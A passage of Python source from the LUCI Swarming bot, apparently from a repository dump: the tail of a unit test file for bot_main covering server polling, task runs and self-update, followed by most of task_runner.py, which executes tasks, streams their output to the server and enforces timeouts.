lambda: self.server)\n    # get_state() return value changes over time. Hardcode its value for the\n    # duration of this test.\n    self.mock(os_utilities, 'get_state', lambda : {'foo': 'bar'})\n    expected_attribs = bot_main.get_attributes(None)\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',\n            {\n              'data': expected_attribs,\n              'headers': {'X-XSRF-Token-Request': '1'},\n            },\n            {'xsrf_token': 'token'},\n          ),\n          (\n            'https://localhost:1/swarming/api/v1/bot/task_error/23',\n            {\n              'data': {\n                'id': expected_attribs['dimensions']['id'][0],\n                'message': 'error',\n                'task_id': 23,\n              },\n              'headers': {'X-XSRF-Token': 'token'},\n            },\n            {},\n          ),\n        ])\n    botobj = bot_main.get_bot()\n    bot_main.post_error_task(botobj, 'error', 23)\n\n  def test_run_bot(self):\n    # Test the run_bot() loop. Does not use self.bot.\n    self.mock(time, 'time', lambda: 126.0)\n    class Foo(Exception):\n      pass\n\n    def poll_server(botobj, _):\n      sleep_streak = botobj.state['sleep_streak']\n      self.assertEqual(botobj.remote, self.server)\n      if sleep_streak == 5:\n        raise Exception('Jumping out of the loop')\n      return False\n    self.mock(bot_main, 'poll_server', poll_server)\n\n    def post_error(botobj, e):\n      self.assertEqual(self.server, botobj._remote)\n      lines = e.splitlines()\n      self.assertEqual('Jumping out of the loop', lines[0])\n      self.assertEqual('Traceback (most recent call last):', lines[1])\n      raise Foo('Necessary to get out of the loop')\n    self.mock(bot.Bot, 'post_error', post_error)\n\n    self.mock(bot_main, 'get_remote', lambda: self.server)\n\n    # Method should have \"self\" as first argument - pylint: disable=E0213\n    # pylint: disable=unused-argument\n    class Popen(object):\n      def __init__(\n          self2, cmd, detached, cwd, stdout, stderr, stdin, close_fds):\n        self2.returncode = None\n        expected = [sys.executable, bot_main.THIS_FILE, 'run_isolated']\n        self.assertEqual(expected, cmd[:len(expected)])\n        self.assertEqual(True, detached)\n        self.assertEqual(subprocess42.PIPE, stdout)\n        self.assertEqual(subprocess42.STDOUT, stderr)\n        self.assertEqual(subprocess42.PIPE, stdin)\n        self.assertEqual(sys.platform != 'win32', close_fds)\n\n      def communicate(self2, i):\n        self.assertEqual(None, i)\n        self2.returncode = 0\n        return '', None\n    self.mock(subprocess42, 'Popen', Popen)\n\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/swarming/api/v1/bot/server_ping',\n            {}, 'foo', None,\n          ),\n        ])\n\n    with self.assertRaises(Foo):\n      bot_main.run_bot(None)\n    self.assertEqual(\n        os_utilities.get_hostname_short(), os.environ['SWARMING_BOT_ID'])\n\n  def test_poll_server_sleep(self):\n    slept = []\n    bit = threading.Event()\n    self.mock(bit, 'wait', slept.append)\n    self.mock(bot_main, 'run_manifest', self.fail)\n    self.mock(bot_main, 'update_bot', self.fail)\n\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',\n            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},\n            {'xsrf_token': 'token'},\n          ),\n          (\n            'https://localhost:1/swarming/api/v1/bot/poll',\n            {\n              'data': self.attributes,\n              'headers': {'X-XSRF-Token': 'token'},\n            },\n            {\n              'cmd': 'sleep',\n              'duration': 1.24,\n            },\n          ),\n        ])\n    self.assertFalse(bot_main.poll_server(self.bot, bit))\n    self.assertEqual([1.24], slept)\n\n  def test_poll_server_run(self):\n    manifest = []\n    bit = threading.Event()\n    self.mock(bit, 'wait', self.fail)\n    self.mock(bot_main, 'run_manifest', lambda *args: manifest.append(args))\n    self.mock(bot_main, 'update_bot', self.fail)\n\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',\n            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},\n            {'xsrf_token': 'token'},\n          ),\n          (\n            'https://localhost:1/swarming/api/v1/bot/poll',\n            {\n              'data': self.bot._attributes,\n              'headers': {'X-XSRF-Token': 'token'},\n            },\n            {\n              'cmd': 'run',\n              'manifest': {'foo': 'bar'},\n            },\n          ),\n        ])\n    self.assertTrue(bot_main.poll_server(self.bot, bit))\n    expected = [(self.bot, {'foo': 'bar'}, time.time())]\n    self.assertEqual(expected, manifest)\n\n  def test_poll_server_update(self):\n    update = []\n    bit = threading.Event()\n    self.mock(bit, 'wait', self.fail)\n    self.mock(bot_main, 'run_manifest', self.fail)\n    self.mock(bot_main, 'update_bot', lambda *args: update.append(args))\n\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',\n            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},\n            {'xsrf_token': 'token'},\n          ),\n          (\n            'https://localhost:1/swarming/api/v1/bot/poll',\n            {\n              'data': self.attributes,\n              'headers': {'X-XSRF-Token': 'token'},\n            },\n            {\n              'cmd': 'update',\n              'version': '123',\n            },\n          ),\n        ])\n    self.assertTrue(bot_main.poll_server(self.bot, bit))\n    self.assertEqual([(self.bot, '123')], update)\n\n  def test_poll_server_restart(self):\n    restart = []\n    bit = threading.Event()\n    self.mock(bit, 'wait', self.fail)\n    self.mock(bot_main, 'run_manifest', self.fail)\n    self.mock(bot_main, 'update_bot', self.fail)\n    self.mock(self.bot, 'restart', lambda *args: restart.append(args))\n\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',\n            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},\n            {'xsrf_token': 'token'},\n          ),\n          (\n            'https://localhost:1/swarming/api/v1/bot/poll',\n            {\n              'data': self.attributes,\n              'headers': {'X-XSRF-Token': 'token'},\n            },\n            {\n              'cmd': 'restart',\n              'message': 'Please die now',\n            },\n          ),\n        ])\n    self.assertTrue(bot_main.poll_server(self.bot, bit))\n    self.assertEqual([('Please die now',)], restart)\n\n  def test_poll_server_restart_load_test(self):\n    os.environ['SWARMING_LOAD_TEST'] = '1'\n    bit = threading.Event()\n    self.mock(bit, 'wait', self.fail)\n    self.mock(bot_main, 'run_manifest', self.fail)\n    self.mock(bot_main, 'update_bot', self.fail)\n    self.mock(self.bot, 'restart', self.fail)\n\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',\n            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},\n            {'xsrf_token': 'token'},\n          ),\n          (\n            'https://localhost:1/swarming/api/v1/bot/poll',\n            {\n              'data': self.attributes,\n              'headers': {'X-XSRF-Token': 'token'},\n            },\n            {\n              'cmd': 'restart',\n              'message': 'Please die now',\n            },\n          ),\n        ])\n    self.assertTrue(bot_main.poll_server(self.bot, bit))\n\n  def _mock_popen(self, returncode=0, exit_code=0, url='https://localhost:1'):\n    result = {\n      'exit_code': exit_code,\n      'must_signal_internal_failure': None,\n      'version': 3,\n    }\n    # Method should have \"self\" as first argument - pylint: disable=E0213\n    class Popen(object):\n      def __init__(\n          self2, cmd, detached, cwd, env, stdout, stderr, stdin, close_fds):\n        self2.returncode = None\n        self2._out_file = os.path.join(\n            self.root_dir, 'work', 'task_runner_out.json')\n        expected = [\n          sys.executable, bot_main.THIS_FILE, 'task_runner',\n          '--swarming-server', url,\n          '--in-file',\n          os.path.join(self.root_dir, 'work', 'task_runner_in.json'),\n          '--out-file', self2._out_file,\n          '--cost-usd-hour', '3600.0', '--start', '100.0',\n          '--min-free-space',\n          str(int(\n            (os_utilities.get_min_free_space(bot_main.THIS_FILE) + 250.) *\n            1024 * 1024)),\n        ]\n        self.assertEqual(expected, cmd)\n        self.assertEqual(True, detached)\n        self.assertEqual(self.bot.base_dir, cwd)\n        self.assertEqual('24', env['SWARMING_TASK_ID'])\n        self.assertTrue(stdout)\n        self.assertEqual(subprocess42.STDOUT, stderr)\n        self.assertEqual(subprocess42.PIPE, stdin)\n        self.assertEqual(sys.platform != 'win32', close_fds)\n\n      def wait(self2, timeout=None): # pylint: disable=unused-argument\n        self2.returncode = returncode\n        with open(self2._out_file, 'wb') as f:\n          json.dump(result, f)\n        return 0\n\n    self.mock(subprocess42, 'Popen', Popen)\n    return result\n\n  def test_run_manifest(self):\n    self.mock(bot_main, 'post_error_task', lambda *args: self.fail(args))\n    def call_hook(botobj, name, *args):\n      if name == 'on_after_task':\n        failure, internal_failure, dimensions, summary = args\n        self.assertEqual(self.attributes['dimensions'], botobj.dimensions)\n        self.assertEqual(False, failure)\n        self.assertEqual(False, internal_failure)\n        self.assertEqual({'os': 'Amiga', 'pool': 'default'}, dimensions)\n        self.assertEqual(result, summary)\n    self.mock(bot_main, 'call_hook', call_hook)\n    result = self._mock_popen(url='https://localhost:3')\n\n    manifest = {\n      'command': ['echo', 'hi'],\n      'dimensions': {'os': 'Amiga', 'pool': 'default'},\n      'grace_period': 30,\n      'hard_timeout': 60,\n      'host': 'https://localhost:3',\n      'task_id': '24',\n    }\n    self.assertEqual(self.root_dir, self.bot.base_dir)\n    bot_main.run_manifest(self.bot, manifest, time.time())\n\n  def test_run_manifest_task_failure(self):\n    self.mock(bot_main, 'post_error_task', lambda *args: self.fail(args))\n    def call_hook(_botobj, name, *args):\n      if name == 'on_after_task':\n        failure, internal_failure, dimensions, summary = args\n        self.assertEqual(True, failure)\n        self.assertEqual(False, internal_failure)\n        self.assertEqual({'pool': 'default'}, dimensions)\n        self.assertEqual(result, summary)\n    self.mock(bot_main, 'call_hook', call_hook)\n    result = self._mock_popen(exit_code=1)\n\n    manifest = {\n      'command': ['echo', 'hi'],\n      'dimensions': {'pool': 'default'},\n      'grace_period': 30,\n      'hard_timeout': 60,\n      'io_timeout': 60,\n      'task_id': '24',\n    }\n    bot_main.run_manifest(self.bot, manifest, time.time())\n\n  def test_run_manifest_internal_failure(self):\n    posted = []\n    self.mock(bot_main, 'post_error_task', lambda *args: posted.append(args))\n    def call_hook(_botobj, name, *args):\n      if name == 'on_after_task':\n        failure, internal_failure, dimensions, summary = args\n        self.assertEqual(False, failure)\n        self.assertEqual(True, internal_failure)\n        self.assertEqual({'pool': 'default'}, dimensions)\n        self.assertEqual(result, summary)\n    self.mock(bot_main, 'call_hook', call_hook)\n    result = self._mock_popen(returncode=1)\n\n    manifest = {\n      'command': ['echo', 'hi'],\n      'dimensions': {'pool': 'default'},\n      'grace_period': 30,\n      'hard_timeout': 60,\n      'io_timeout': 60,\n      'task_id': '24',\n    }\n    bot_main.run_manifest(self.bot, manifest, time.time())\n    expected = [(self.bot, 'Execution failed: internal error (1).', '24')]\n    self.assertEqual(expected, posted)\n\n  def test_run_manifest_exception(self):\n    posted = []\n    def post_error_task(botobj, msg, task_id):\n      posted.append((botobj, msg.splitlines()[0], task_id))\n    self.mock(bot_main, 'post_error_task', post_error_task)\n    def call_hook(_botobj, name, *args):\n      if name == 'on_after_task':\n        failure, internal_failure, dimensions, summary = args\n        self.assertEqual(False, failure)\n        self.assertEqual(True, internal_failure)\n        self.assertEqual({'pool': 'default'}, dimensions)\n        self.assertEqual({}, summary)\n    self.mock(bot_main, 'call_hook', call_hook)\n    def raiseOSError(*_a, **_k):\n      raise OSError('Dang')\n    self.mock(subprocess42, 'Popen', raiseOSError)\n\n    manifest = {\n      'command': ['echo', 'hi'],\n      'dimensions': {'pool': 'default'},\n      'grace_period': 30,\n      'hard_timeout': 60,\n      'task_id': '24',\n    }\n    bot_main.run_manifest(self.bot, manifest, time.time())\n    expected = [(self.bot, 'Internal exception occured: Dang', '24')]\n    self.assertEqual(expected, posted)\n\n  def test_update_bot(self):\n    # In a real case 'update_bot' never exits and doesn't call 'post_error'.\n    # Under the test however forever-blocking calls finish, and post_error is\n    # called.\n    self.mock(self.bot, 'post_error', lambda *_: None)\n    # Mock the file to download in the temporary directory.\n    self.mock(\n        bot_main, 'THIS_FILE',\n        os.path.join(self.root_dir, 'swarming_bot.1.zip'))\n    new_zip = os.path.join(self.root_dir, 'swarming_bot.2.zip')\n    # This is necessary otherwise zipfile will crash.\n    self.mock(time, 'time', lambda: 1400000000)\n    def url_retrieve(f, url):\n      self.assertEqual(\n          'https://localhost:1/swarming/api/v1/bot/bot_code/123', url)\n      self.assertEqual(new_zip, f)\n      # Create a valid zip that runs properly.\n      with zipfile.ZipFile(f, 'w') as z:\n        z.writestr('__main__.py', 'print(\"hi\")')\n      return True\n    self.mock(net, 'url_retrieve', url_retrieve)\n\n    calls = []\n    def exec_python(args):\n      calls.append(args)\n      return 23\n    self.mock(bot_main.common, 'exec_python', exec_python)\n\n    with self.assertRaises(SystemExit) as e:\n      bot_main.update_bot(self.bot, '123')\n    self.assertEqual(23, e.exception.code)\n\n    self.assertEqual([[new_zip, 'start_slave', '--survive']], calls)\n\n  def test_main(self):\n    def check(x):\n      self.assertEqual(logging.WARNING, x)\n    self.mock(logging_utils, 'set_console_level', check)\n\n    def run_bot(error):\n      self.assertEqual(None, error)\n      return 0\n    self.mock(bot_main, 'run_bot', run_bot)\n\n    class Singleton(object):\n      # pylint: disable=no-self-argument\n      def acquire(self2):\n        return True\n      def release(self2):\n        self.fail()\n    self.mock(bot_main, 'SINGLETON', Singleton())\n\n    self.assertEqual(0, bot_main.main([]))\n\n\nif __name__ == '__main__':\n  fix_encoding.fix_encoding()\n  if '-v' in sys.argv:\n    unittest.TestCase.maxDiff = None\n  logging.basicConfig(\n      level=logging.DEBUG if '-v' in sys.argv else logging.CRITICAL)\n  unittest.main()\n/n/n/n/appengine/swarming/swarming_bot/bot_code/task_runner.py/n/n# Copyright 2013 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Runs a Swarming task.\n\nDownloads all the necessary files to run the task, executes the command and\nstreams results back to the Swarming server.\n\nThe process exit code is 0 when the task was executed, even if the task itself\nfailed. If there's any failure in the setup or teardown, like invalid packet\nresponse, failure to contact the server, etc, a non zero exit code is used. It's\nup to the calling process (bot_main.py) to signal that there was an internal\nfailure and to cancel this task run and ask the server to retry it.\n\"\"\"\n\nimport base64\nimport json\nimport logging\nimport optparse\nimport os\nimport signal\nimport sys\nimport time\n\nimport xsrf_client\nfrom utils import net\nfrom utils import on_error\nfrom utils import subprocess42\nfrom utils import zip_package\n\n\n# Path to this file or the zip containing this file.\nTHIS_FILE = os.path.abspath(zip_package.get_main_script_path())\n\n\n# Sends a maximum of 100kb of stdout per task_update packet.\nMAX_CHUNK_SIZE = 102400\n\n\n# Maximum wait between task_update packet when there's no output.\nMAX_PACKET_INTERVAL = 30\n\n\n# Minimum wait between task_update packet when there's output.\nMIN_PACKET_INTERNAL = 10\n\n\n# Current task_runner_out version.\nOUT_VERSION = 3\n\n\n# On Windows, SIGTERM is actually sent as SIGBREAK since there's no real\n# SIGTERM.  SIGBREAK is not defined on posix since it's a pure Windows concept.\nSIG_BREAK_OR_TERM = (\n    signal.SIGBREAK if sys.platform == 'win32' else signal.SIGTERM)\n\n\n# Used to implement monotonic_time for a clock that never goes backward.\n_last_now = 0\n\n\ndef monotonic_time():\n  \"\"\"Returns monotonically increasing time.\"\"\"\n  global _last_now\n  now = time.time()\n  if now > _last_now:\n    # TODO(maruel): If delta is large, probably worth alerting via ereporter2.\n    _last_now = now\n  return _last_now\n\n\ndef get_run_isolated():\n  \"\"\"Returns the path to itself to run run_isolated.\n\n  Mocked in test to point to the real run_isolated.py script.\n  \"\"\"\n  return [sys.executable, THIS_FILE, 'run_isolated']\n\n\ndef get_isolated_cmd(\n    work_dir, task_details, isolated_result, min_free_space):\n  \"\"\"Returns the command to call run_isolated. Mocked in tests.\"\"\"\n  bot_dir = os.path.dirname(work_dir)\n  if os.path.isfile(isolated_result):\n    os.remove(isolated_result)\n  cmd = get_run_isolated()\n  cmd.extend(\n      [\n        '--isolated', task_details.inputs_ref['isolated'].encode('utf-8'),\n        '--namespace', task_details.inputs_ref['namespace'].encode('utf-8'),\n        '-I', task_details.inputs_ref['isolatedserver'].encode('utf-8'),\n        '--json', isolated_result,\n        '--log-file', os.path.join(bot_dir, 'logs', 'run_isolated.log'),\n        '--cache', os.path.join(bot_dir, 'cache'),\n        '--root-dir', os.path.join(work_dir, 'isolated'),\n      ])\n  if min_free_space:\n    cmd.extend(('--min-free-space', str(min_free_space)))\n\n  if task_details.hard_timeout:\n    cmd.extend(('--hard-timeout', str(task_details.hard_timeout)))\n  if task_details.grace_period:\n    cmd.extend(('--grace-period', str(task_details.grace_period)))\n  if task_details.extra_args:\n    cmd.append('--')\n    cmd.extend(task_details.extra_args)\n  return cmd\n\n\nclass TaskDetails(object):\n  def __init__(self, data):\n    \"\"\"Loads the raw data.\n\n    It is expected to have at least:\n     - bot_id\n     - command as a list of str\n     - data as a list of urls\n     - env as a dict\n     - hard_timeout\n     - io_timeout\n     - task_id\n    \"\"\"\n    logging.info('TaskDetails(%s)', data)\n    if not isinstance(data, dict):\n      raise ValueError('Expected dict, got %r' % data)\n\n    # Get all the data first so it fails early if the task details is invalid.\n    self.bot_id = data['bot_id']\n\n    # Raw command. Only self.command or self.inputs_ref can be set.\n    self.command = data['command'] or []\n\n    # Isolated command. Is a serialized version of task_request.FilesRef.\n    self.inputs_ref = data['inputs_ref']\n    self.extra_args = data['extra_args']\n\n    self.env = {\n      k.encode('utf-8'): v.encode('utf-8') for k, v in data['env'].iteritems()\n    }\n    self.grace_period = data['grace_period']\n    self.hard_timeout = data['hard_timeout']\n    self.io_timeout = data['io_timeout']\n    self.task_id = data['task_id']\n\n\nclass MustExit(Exception):\n  \"\"\"Raised on signal that the process must exit immediately.\"\"\"\n  def __init__(self, sig):\n    super(MustExit, self).__init__()\n    self.signal = sig\n\n\ndef load_and_run(\n    in_file, swarming_server, cost_usd_hour, start, out_file, min_free_space):\n  \"\"\"Loads the task's metadata and execute it.\n\n  This may throw all sorts of exceptions in case of failure. It's up to the\n  caller to trap them. These shall be considered 'internal_failure' instead of\n  'failure' from a TaskRunResult standpoint.\n  \"\"\"\n  # The work directory is guaranteed to exist since it was created by\n  # bot_main.py and contains the manifest. Temporary files will be downloaded\n  # there. It's bot_main.py that will delete the directory afterward. Tests are\n  # not run from there.\n  task_result = None\n  def handler(sig, _):\n    logging.info('Got signal %s', sig)\n    raise MustExit(sig)\n  work_dir = os.path.dirname(out_file)\n  try:\n    with subprocess42.set_signal_handler([SIG_BREAK_OR_TERM], handler):\n      if not os.path.isdir(work_dir):\n        raise ValueError('%s expected to exist' % work_dir)\n\n      with open(in_file, 'rb') as f:\n        task_details = TaskDetails(json.load(f))\n\n      task_result = run_command(\n          swarming_server, task_details, work_dir, cost_usd_hour, start,\n          min_free_space)\n  except MustExit as e:\n    # This normally means run_command() didn't get the chance to run, as it\n    # itself trap MustExit and will report accordingly. In this case, we want\n    # the parent process to send the message instead.\n    if not task_result:\n      task_result = {\n        u'exit_code': None,\n        u'hard_timeout': False,\n        u'io_timeout': False,\n        u'must_signal_internal_failure':\n            u'task_runner received signal %s' % e.signal,\n        u'version': OUT_VERSION,\n      }\n  finally:\n    # We've found tests to delete 'work' when quitting, causing an exception\n    # here. Try to recreate the directory if necessary.\n    if not os.path.isdir(work_dir):\n      os.mkdir(work_dir)\n    with open(out_file, 'wb') as f:\n      json.dump(task_result, f)\n\n\ndef post_update(swarming_server, params, exit_code, stdout, output_chunk_start):\n  \"\"\"Posts task update to task_update.\n\n  Arguments:\n    swarming_server: XsrfRemote instance.\n    params: Default JSON parameters for the POST.\n    exit_code: Process exit code, only when a command completed.\n    stdout: Incremental output since last call, if any.\n    output_chunk_start: Total number of stdout previously sent, for coherency\n        with the server.\n  \"\"\"\n  params = params.copy()\n  if exit_code is not None:\n    params['exit_code'] = exit_code\n  if stdout:\n    # The output_chunk_start is used by the server to make sure that the stdout\n    # chunks are processed and saved in the DB in order.\n    params['output'] = base64.b64encode(stdout)\n    params['output_chunk_start'] = output_chunk_start\n  # TODO(maruel): Support early cancellation.\n  # https://code.google.com/p/swarming/issues/detail?id=62\n  resp = swarming_server.url_read_json(\n      '/swarming/api/v1/bot/task_update/%s' % params['task_id'], data=params)\n  logging.debug('post_update() = %s', resp)\n  if resp.get('error'):\n    # Abandon it. This will force a process exit.\n    raise ValueError(resp.get('error'))\n\n\ndef should_post_update(stdout, now, last_packet):\n  \"\"\"Returns True if it's time to send a task_update packet via post_update().\n\n  Sends a packet when one of this condition is met:\n  - more than MAX_CHUNK_SIZE of stdout is buffered.\n  - last packet was sent more than MIN_PACKET_INTERNAL seconds ago and there was\n    stdout.\n  - last packet was sent more than MAX_PACKET_INTERVAL seconds ago.\n  \"\"\"\n  packet_interval = MIN_PACKET_INTERNAL if stdout else MAX_PACKET_INTERVAL\n  return len(stdout) >= MAX_CHUNK_SIZE or (now - last_packet) > packet_interval\n\n\ndef calc_yield_wait(task_details, start, last_io, timed_out, stdout):\n  \"\"\"Calculates the maximum number of seconds to wait in yield_any().\"\"\"\n  now = monotonic_time()\n  if timed_out:\n    # Give a |grace_period| seconds delay.\n    if task_details.grace_period:\n      return max(now - timed_out - task_details.grace_period, 0.)\n    return 0.\n\n  out = MIN_PACKET_INTERNAL if stdout else MAX_PACKET_INTERVAL\n  if task_details.hard_timeout:\n    out = min(out, start + task_details.hard_timeout - now)\n  if task_details.io_timeout:\n    out = min(out, last_io + task_details.io_timeout - now)\n  out = max(out, 0)\n  logging.debug('calc_yield_wait() = %d', out)\n  return out\n\n\ndef kill_and_wait(proc, grace_period, reason):\n  logging.warning('SIGTERM finally due to %s', reason)\n  proc.terminate()\n  try:\n    proc.wait(grace_period)\n  except subprocess42.TimeoutError:\n    logging.warning('SIGKILL finally due to %s', reason)\n    proc.kill()\n  exit_code = proc.wait()\n  logging.info('Waiting for proces exit in finally - done')\n  return exit_code\n\n\ndef run_command(\n    swarming_server, task_details, work_dir, cost_usd_hour, task_start,\n    min_free_space):\n  \"\"\"Runs a command and sends packets to the server to stream results back.\n\n  Implements both I/O and hard timeouts. Sends the packets numbered, so the\n  server can ensure they are processed in order.\n\n  Returns:\n    Metadata about the command.\n  \"\"\"\n  # TODO(maruel): This function is incomprehensible, split and refactor.\n  # Signal the command is about to be started.\n  last_packet = start = now = monotonic_time()\n  params = {\n    'cost_usd': cost_usd_hour * (now - task_start) / 60. / 60.,\n    'id': task_details.bot_id,\n    'task_id': task_details.task_id,\n  }\n  post_update(swarming_server, params, None, '', 0)\n\n  if task_details.command:\n    # Raw command.\n    cmd = task_details.command\n    isolated_result = None\n  else:\n    # Isolated task.\n    isolated_result = os.path.join(work_dir, 'isolated_result.json')\n    cmd = get_isolated_cmd(\n        work_dir, task_details, isolated_result, min_free_space)\n    # Hard timeout enforcement is deferred to run_isolated. Grace is doubled to\n    # give one 'grace_period' slot to the child process and one slot to upload\n    # the results back.\n    task_details.hard_timeout = 0\n    if task_details.grace_period:\n      task_details.grace_period *= 2\n\n  try:\n    # TODO(maruel): Support both channels independently and display stderr in\n    # red.\n    env = None\n    if task_details.env:\n      env = os.environ.copy()\n      for key, value in task_details.env.iteritems():\n        if not value:\n          env.pop(key, None)\n        else:\n          env[key] = value\n    logging.info('cmd=%s', cmd)\n    logging.info('env=%s', env)\n    try:\n      proc = subprocess42.Popen(\n          cmd,\n          env=env,\n          cwd=work_dir,\n          detached=True,\n          stdout=subprocess42.PIPE,\n          stderr=subprocess42.STDOUT,\n          stdin=subprocess42.PIPE)\n    except OSError as e:\n      stdout = 'Command \"%s\" failed to start.\\nError: %s' % (' '.join(cmd), e)\n      now = monotonic_time()\n      params['cost_usd'] = cost_usd_hour * (now - task_start) / 60. / 60.\n      params['duration'] = now - start\n      params['io_timeout'] = False\n      params['hard_timeout'] = False\n      post_update(swarming_server, params, 1, stdout, 0)\n      return {\n        u'exit_code': -1,\n        u'hard_timeout': False,\n        u'io_timeout': False,\n        u'must_signal_internal_failure': None,\n        u'version': OUT_VERSION,\n      }\n\n    output_chunk_start = 0\n    stdout = ''\n    exit_code = None\n    had_hard_timeout = False\n    had_io_timeout = False\n    must_signal_internal_failure = None\n    kill_sent = False\n    timed_out = None\n    try:\n      calc = lambda: calc_yield_wait(\n          task_details, start, last_io, timed_out, stdout)\n      maxsize = lambda: MAX_CHUNK_SIZE - len(stdout)\n      last_io = monotonic_time()\n      for _, new_data in proc.yield_any(maxsize=maxsize, timeout=calc):\n        now = monotonic_time()\n        if new_data:\n          stdout += new_data\n          last_io = now\n\n        # Post update if necessary.\n        if should_post_update(stdout, now, last_packet):\n          last_packet = monotonic_time()\n          params['cost_usd'] = (\n              cost_usd_hour * (last_packet - task_start) / 60. / 60.)\n          post_update(swarming_server, params, None, stdout, output_chunk_start)\n          output_chunk_start += len(stdout)\n          stdout = ''\n\n        # Send signal on timeout if necessary. Both are failures, not\n        # internal_failures.\n        # Eventually kill but return 0 so bot_main.py doesn't cancel the task.\n        if not timed_out:\n          if (task_details.io_timeout and\n              now - last_io > task_details.io_timeout):\n            had_io_timeout = True\n            logging.warning('I/O timeout; sending SIGTERM')\n            proc.terminate()\n            timed_out = monotonic_time()\n          elif (task_details.hard_timeout and\n              now - start > task_details.hard_timeout):\n            had_hard_timeout = True\n            logging.warning('Hard timeout; sending SIGTERM')\n            proc.terminate()\n            timed_out = monotonic_time()\n        else:\n          # During grace period.\n          if not kill_sent and now >= timed_out + task_details.grace_period:\n            # Now kill for real. The user can distinguish between the following\n            # states:\n            # - signal but process exited within grace period,\n            #   (hard_|io_)_timed_out will be set but the process exit code will\n            #   be script provided.\n            # - processed exited late, exit code will be -9 on posix.\n            logging.warning('Grace exhausted; sending SIGKILL')\n            proc.kill()\n            kill_sent = True\n      logging.info('Waiting for proces exit')\n      exit_code = proc.wait()\n    except MustExit as e:\n      # TODO(maruel): Do the send SIGTERM to child process and give it\n      # task_details.grace_period to terminate.\n      must_signal_internal_failure = (\n          u'task_runner received signal %s' % e.signal)\n      exit_code = kill_and_wait(\n          proc, task_details.grace_period, 'signal %d' % e.signal)\n    except (IOError, OSError):\n      # Something wrong happened, try to kill the child process.\n      had_hard_timeout = True\n      exit_code = kill_and_wait(\n          proc, task_details.grace_period, 'exception %s' % e)\n\n    # This is the very last packet for this command. It if was an isolated task,\n    # include the output reference to the archived .isolated file.\n    now = monotonic_time()\n    params['cost_usd'] = cost_usd_hour * (now - task_start) / 60. / 60.\n    params['duration'] = now - start\n    params['io_timeout'] = had_io_timeout\n    params['hard_timeout'] = had_hard_timeout\n    if isolated_result:\n      try:\n        if ((had_io_timeout or had_hard_timeout) and\n            not os.path.isfile(isolated_result)):\n          # It's possible that run_isolated failed to quit quickly enough; it\n          # could be because there was too much data to upload back or something\n          # else. Do not create an internal error, just send back the (partial)\n          # view as task_runner saw it, for example the real exit_code is\n          # unknown.\n          logging.warning('TIMED_OUT and there\\'s no result file')\n          exit_code = -1\n        else:\n          # See run_isolated.py for the format.\n          with open(isolated_result, 'rb') as f:\n            run_isolated_result = json.load(f)\n          logging.debug('run_isolated:\\n%s', run_isolated_result)\n          # TODO(maruel): Grab statistics (cache hit rate, data downloaded,\n          # mapping time, etc) from run_isolated and push them to the server.\n          if run_isolated_result['outputs_ref']:\n            params['outputs_ref'] = run_isolated_result['outputs_ref']\n          had_hard_timeout = (\n              had_hard_timeout or run_isolated_result['had_hard_timeout'])\n          params['hard_timeout'] = had_hard_timeout\n          if not had_io_timeout and not had_hard_timeout:\n            if run_isolated_result['internal_failure']:\n              must_signal_internal_failure = (\n                  run_isolated_result['internal_failure'])\n              logging.error('%s', must_signal_internal_failure)\n            elif exit_code:\n              # TODO(maruel): Grab stdout from run_isolated.\n              must_signal_internal_failure = (\n                  'run_isolated internal failure %d' % exit_code)\n              logging.error('%s', must_signal_internal_failure)\n          exit_code = run_isolated_result['exit_code']\n          if run_isolated_result.get('duration') is not None:\n            # Calculate the real task duration as measured by run_isolated and\n            # calculate the remaining overhead.\n            params['bot_overhead'] = params['duration']\n            params['duration'] = run_isolated_result['duration']\n            params['bot_overhead'] -= params['duration']\n            params['bot_overhead'] -= run_isolated_result.get(\n                'download', {}).get('duration', 0)\n            params['bot_overhead'] -= run_isolated_result.get(\n                'upload', {}).get('duration', 0)\n            if params['bot_overhead'] < 0:\n              params['bot_overhead'] = 0\n          stats = run_isolated_result.get('stats')\n          if stats:\n            params['isolated_stats'] = stats\n      except (IOError, OSError, ValueError) as e:\n        logging.error('Swallowing error: %s', e)\n        if not must_signal_internal_failure:\n          must_signal_internal_failure = str(e)\n    # TODO(maruel): Send the internal failure here instead of sending it through\n    # bot_main, this causes a race condition.\n    if exit_code is None:\n      exit_code = -1\n    post_update(swarming_server, params, exit_code, stdout, output_chunk_start)\n    return {\n      u'exit_code': exit_code,\n      u'hard_timeout': had_hard_timeout,\n      u'io_timeout': had_io_timeout,\n      u'must_signal_internal_failure': must_signal_internal_failure,\n      u'version': OUT_VERSION,\n    }\n  finally:\n    if isolated_result:\n      try:\n        os.remove(isolated_result)\n      except OSError:\n        pass\n\n\ndef main(args):\n  parser = optparse.OptionParser(description=sys.modules[__name__].__doc__)\n  parser.add_option('--in-file', help='Name of the request file')\n  parser.add_option(\n      '--out-file', help='Name of the JSON file to write a task summary to')\n  parser.add_option(\n      '--swarming-server', help='Swarming server to send data back')\n  parser.add_option(\n      '--cost-usd-hour', type='float', help='Cost of this VM in $/h')\n  parser.add_option('--start', type='float', help='Time this task was started')\n  parser.add_option(\n      '--min-free-space', type='int',\n      help='Value to send down to run_isolated')\n\n  options, args = parser.parse_args(args)\n  if not options.in_file or not options.out_file or args:\n    parser.error('task_runner is meant to be used by swarming_bot.')\n\n  on_error.report_on_exception_exit(options.swarming_server)\n\n  logging.info('starting')\n  remote = xsrf_client.XsrfRemote(options.swarming_server)\n\n  now = monotonic_time()\n  if options.start > now:\n    options.start = now\n\n  try:\n    load_and_run(\n        options.in_file, remote, options.cost_usd_hour, options.start,\n        options.out_file, 